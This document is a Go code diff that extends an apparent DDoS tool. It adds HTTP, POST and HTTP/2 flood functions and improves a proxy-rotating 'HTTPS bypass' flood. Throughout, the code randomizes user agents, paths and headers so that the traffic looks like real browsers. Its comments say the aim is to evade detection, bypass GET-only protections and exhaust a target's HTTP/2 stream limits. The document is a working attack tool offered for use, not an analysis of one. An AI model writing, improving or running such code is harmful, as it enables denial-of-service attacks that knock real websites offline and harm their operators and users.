@@ -8,6 +8,8 @@ import (
 	"log"
 	"math/rand"
 	"net"
+	"net/http"
+	"net/url"
 	"strings"
 	"sync"
 	"sync/atomic"
@@ -1222,6 +1224,108 @@ func StartTCPFloodEx(cfg AttackConfig) *AttackSession {
 	return s
 }
 
+// ============================================================
+// L7 攻击基础设施：浏览器 UA 池 / 随机路径 / 请求构造 / 字节统计
+// ============================================================
+
+// browserUAs 常见浏览器 UA 池（请求轮换，降低特征一致性）
+var browserUAs = []string{
+	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
+	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
+	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
+	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
+	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
+	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
+	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
+	"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0",
+	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
+	"Mozilla/5.0 (iPad; CPU OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
+	"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36",
+	"Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
+	"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
+	"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
+	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
+	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 OPR/109.0.0.0",
+	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
+	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+	"Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+}
+
+// randomUA 随机选一个浏览器 UA
+func randomUA(rng *FastRNG) string {
+	return browserUAs[rng.Intn(len(browserUAs))]
+}
+
+// randomAlpha 生成 n 位随机字母数字串（路径用）
+func randomAlpha(rng *FastRNG, n int) string {
+	const chars = "abcdefghijklmnopqrstuvwxyz0123456789"
+	b := make([]byte, n)
+	for i := range b {
+		b[i] = chars[rng.Intn(len(chars))]
+	}
+	return string(b)
+}
+
+// randomL7Path 随机请求路径：混合真实风格路径，避免固定 "/" 无压力
+func randomL7Path(rng *FastRNG) string {
+	switch rng.Intn(5) {
+	case 0:
+		return "/"
+	case 1:
+		return "/" + randomAlpha(rng, 6+rng.Intn(10))
+	case 2:
+		return "/api/" + randomAlpha(rng, 5+rng.Intn(8))
+	case 3:
+		return "/assets/" + randomAlpha(rng, 4+rng.Intn(8)) + ".js"
+	default:
+		return "/page/" + randomAlpha(rng, 8+rng.Intn(10)) + ".html"
+	}
+}
+
+// buildL7Request 构造带随机特征（UA/路径/Accept/Referer）的 HTTP 请求。
+// body 非空时设置 Content-Type（POST 等）。
+func buildL7Request(method, target string, body []byte, rng *FastRNG) *http.Request {
+	// 随机路径覆盖原路径（http://host/xxx → http://host/<random>）
+	path := randomL7Path(rng)
+	reqURL := target
+	if u, err := url.Parse(target); err == nil && u.Host != "" {
+		reqURL = u.Scheme + "://" + u.Host + path
+	}
+	req, err := http.NewRequest(method, reqURL, bytes.NewReader(body))
+	if err != nil {
+		req, _ = http.NewRequest(method, target, bytes.NewReader(body))
+	}
+	req.Header.Set("User-Agent", randomUA(rng))
+	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
+	req.Header.Set("Accept-Language", "zh-CN,zh;q=0.9,en;q=0.8")
+	req.Header.Set("Connection", "keep-alive")
+	if rng.Intn(3) == 0 {
+		req.Header.Set("Referer", "https://"+req.URL.Host+"/")
+	}
+	if len(body) > 0 {
+		if rng.Intn(2) == 0 {
+			req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+		} else {
+			req.Header.Set("Content-Type", "application/json")
+		}
+	}
+	return req
+}
+
+// estimateRequestBytes 估算请求在线路上的字节数（方法+路径+头+body），
+// 用于统计 BytesSent（此前 http_flood 恒记 1 字节，BPS 全失真）
+func estimateRequestBytes(method string, reqURL string, body []byte, ua string) int {
+	n := len(method) + 1 + len(reqURL) + 2 // 请求行
+	n += 16 + len(ua)                      // User-Agent
+	n += 40                                // Accept / Accept-Language / Connection
+	n += 120                               // 其他头与开销
+	if len(body) > 0 {
+		n += 30 + len(body) // Content-Type/Content-Length + body
+	}
+	return n
+}
+
 func StartHTTPFlood(target string, duration int, threads int) *AttackSession {
 	return StartHTTPFloodEx(AttackConfig{
 		Target: target, Duration: duration, Threads: threads,
@@ -1253,6 +1357,7 @@ func StartHTTPFloodEx(cfg AttackConfig) *AttackSession {
 				defer wg.Done()
 				endTime := time.Now().Add(dur)
 				client := newHTTPClient()
+				rng := NewFastRNG(time.Now().UnixNano() + int64(seed))
 				var targetIdx uint64
 				tc := newTimeCache()
 
@@ -1273,14 +1378,19 @@ func StartHTTPFloodEx(cfg AttackConfig) *AttackSession {
 						continue
 					}
 
-					resp, err := client.Get(tgt)
+					// 随机特征请求：UA/路径/Accept/Referer 轮换
+					req := buildL7Request("GET", tgt, nil, rng)
+					reqBytes := estimateRequestBytes("GET", req.URL.String(), nil, req.Header.Get("User-Agent"))
+
+					resp, err := client.Do(req)
 					if err != nil {
 						atomic.AddUint64(&s.Stats.Errors, 1)
 						continue
 					}
 					resp.Body.Close()
 					atomic.AddUint64(&s.Stats.PacketsSent, 1)
-					atomic.AddUint64(&s.Stats.BytesSent, 1)
+					// 统计修正：按实际请求字节计（此前恒记 1，BPS 失真）
+					atomic.AddUint64(&s.Stats.BytesSent, uint64(reqBytes))
 					tc.refresh()
 				}
 			}(i)
@@ -1288,6 +1398,170 @@ func StartHTTPFloodEx(cfg AttackConfig) *AttackSession {
 
 		// 可中断等待：任务到期或被 Stop()/熔断关闭 StopChan 时立即返回，
 		// 使 Stop() 不必阻塞到 duration 自然结束。
+		select {
+		case <-time.After(dur):
+		case <-s.StopChan:
+		}
+		s.finish()
+		waitGroupTimeout(&wg, 5*time.Second)
+		close(s.DoneChan)
+	}()
+
+	return s
+}
+
+// StartPOSTFloodEx POST 洪水：随机 body（大小由 PacketSize 控制，默认 512B），
+// 打目标业务处理（数据库/日志/解析），绕过只挡 GET 的防护。
+func StartPOSTFloodEx(cfg AttackConfig) *AttackSession {
+	s := NewAttackSession(cfg.Target, cfg.Targets, "post_flood", newRateLimiter(cfg.RateLimitPPS, cfg.RateLimitBPS))
+	if cfg.Duration < 1 {
+		cfg.Duration = 60
+	}
+	if cfg.Threads < 1 {
+		cfg.Threads = 10
+	}
+	bodySize := cfg.PacketSize
+	if bodySize < 1 || bodySize > 65507 {
+		bodySize = 512
+	}
+
+	targets := resolveTargetStrings(cfg)
+	if len(targets) == 0 {
+		s.abort()
+		return s
+	}
+
+	go func() {
+		var wg sync.WaitGroup
+		dur := time.Duration(cfg.Duration) * time.Second
+
+		for i := 0; i < cfg.Threads; i++ {
+			wg.Add(1)
+			go func(seed int) {
+				defer wg.Done()
+				endTime := time.Now().Add(dur)
+				client := newHTTPClient()
+				rng := NewFastRNG(time.Now().UnixNano() + int64(seed))
+				var targetIdx uint64
+				tc := newTimeCache()
+				body := make([]byte, bodySize)
+
+				for tc.since(endTime) < 0 {
+					select {
+					case <-s.StopChan:
+						return
+					default:
+					}
+
+					tgt := targets[int(atomic.AddUint64(&targetIdx, 1))%len(targets)]
+					if !strings.HasPrefix(tgt, "http") {
+						tgt = "http://" + tgt
+					}
+
+					if !s.checkRate(1) {
+						time.Sleep(time.Millisecond * 10)
+						continue
+					}
+
+					// 随机 body 内容
+					rng.Read(body)
+					req := buildL7Request("POST", tgt, body, rng)
+					reqBytes := estimateRequestBytes("POST", req.URL.String(), body, req.Header.Get("User-Agent"))
+
+					resp, err := client.Do(req)
+					if err != nil {
+						atomic.AddUint64(&s.Stats.Errors, 1)
+						continue
+					}
+					resp.Body.Close()
+					atomic.AddUint64(&s.Stats.PacketsSent, 1)
+					atomic.AddUint64(&s.Stats.BytesSent, uint64(reqBytes))
+					tc.refresh()
+				}
+			}(i)
+		}
+
+		select {
+		case <-time.After(dur):
+		case <-s.StopChan:
+		}
+		s.finish()
+		waitGroupTimeout(&wg, 5*time.Second)
+		close(s.DoneChan)
+	}()
+
+	return s
+}
+
+// StartHTTP2FloodEx HTTP/2 洪水：threads 路并发请求共享一个 h2 客户端，
+// 单/少数连接上多路复用（无 fd 压力、PPS 极高），打爆目标 h2 流并发上限。
+// https:// 目标自动协商 h2；http:// 目标用明文 h2c。
+func StartHTTP2FloodEx(cfg AttackConfig) *AttackSession {
+	s := NewAttackSession(cfg.Target, cfg.Targets, "http2_flood", newRateLimiter(cfg.RateLimitPPS, cfg.RateLimitBPS))
+	if cfg.Duration < 1 {
+		cfg.Duration = 60
+	}
+	if cfg.Threads < 1 {
+		cfg.Threads = 10
+	}
+
+	targets := resolveTargetStrings(cfg)
+	if len(targets) == 0 {
+		s.abort()
+		return s
+	}
+	// http:// 目标用明文 h2c；https:// 目标走 TLS+ALPN 协商 h2
+	h2c := !strings.HasPrefix(targets[0], "https")
+
+	go func() {
+		var wg sync.WaitGroup
+		dur := time.Duration(cfg.Duration) * time.Second
+
+		for i := 0; i < cfg.Threads; i++ {
+			wg.Add(1)
+			go func(seed int) {
+				defer wg.Done()
+				endTime := time.Now().Add(dur)
+				// 每线程独立 client：h2 多路复用，连接数 = 线程数（可控）
+				client := newHTTP2Client(h2c)
+				rng := NewFastRNG(time.Now().UnixNano() + int64(seed))
+				var targetIdx uint64
+				tc := newTimeCache()
+
+				for tc.since(endTime) < 0 {
+					select {
+					case <-s.StopChan:
+						return
+					default:
+					}
+
+					tgt := targets[int(atomic.AddUint64(&targetIdx, 1))%len(targets)]
+					if !strings.HasPrefix(tgt, "http") {
+						tgt = "http://" + tgt
+					}
+
+					if !s.checkRate(1) {
+						time.Sleep(time.Millisecond * 10)
+						continue
+					}
+
+					req := buildL7Request("GET", tgt, nil, rng)
+					reqBytes := estimateRequestBytes("GET", req.URL.String(), nil, req.Header.Get("User-Agent"))
+					req.Proto = "HTTP/2.0"
+
+					resp, err := client.Do(req)
+					if err != nil {
+						atomic.AddUint64(&s.Stats.Errors, 1)
+						continue
+					}
+					resp.Body.Close()
+					atomic.AddUint64(&s.Stats.PacketsSent, 1)
+					atomic.AddUint64(&s.Stats.BytesSent, uint64(reqBytes))
+					tc.refresh()
+				}
+			}(i)
+		}
+
 		select {
 		case <-time.After(dur):
 		case <-s.StopChan:
@@ -1332,8 +1606,10 @@ func StartHTTPSBypassEx(cfg AttackConfig) *AttackSession {
 				endTime := time.Now().Add(dur)
 				var targetIdx uint64
 				tc := newTimeCache()
+				rng := NewFastRNG(time.Now().UnixNano() + int64(seed))
 
 				client := newProxyHTTPClient()
+				failStreak := 0
 				iter := 0
 
 				for tc.since(endTime) < 0 {
@@ -1356,20 +1632,37 @@ func StartHTTPSBypassEx(cfg AttackConfig) *AttackSession {
 						continue
 					}
 
-					if iter%20 == 0 {
+					// 死代理即时切换：连续 3 次失败立即换代理（此前要等 20 次
+					// 请求才轮换，死代理期间全部白打）
+					if failStreak >= 3 {
 						client.CloseIdleConnections()
 						client = newProxyHTTPClient()
+						failStreak = 0
+						iter = 0
+					}
+					// 主动轮换：每 50 次请求换一个代理（IP 多样性）
+					if iter >= 50 {
+						client.CloseIdleConnections()
+						client = newProxyHTTPClient()
+						iter = 0
 					}
 					iter++
 
-					resp, err := client.Get(tgt)
+					// 随机特征请求（UA/路径轮换）
+					req := buildL7Request("GET", tgt, nil, rng)
+					reqBytes := estimateRequestBytes("GET", req.URL.String(), nil, req.Header.Get("User-Agent"))
+
+					resp, err := client.Do(req)
 					if err != nil {
+						failStreak++
 						atomic.AddUint64(&s.Stats.Errors, 1)
 						continue
 					}
+					failStreak = 0
 					resp.Body.Close()
 					atomic.AddUint64(&s.Stats.PacketsSent, 1)
-					atomic.AddUint64(&s.Stats.BytesSent, 1)
+					// 统计修正：按实际请求字节计
+					atomic.AddUint64(&s.Stats.BytesSent, uint64(reqBytes))
 					tc.refresh()
 				}
 			}(i)
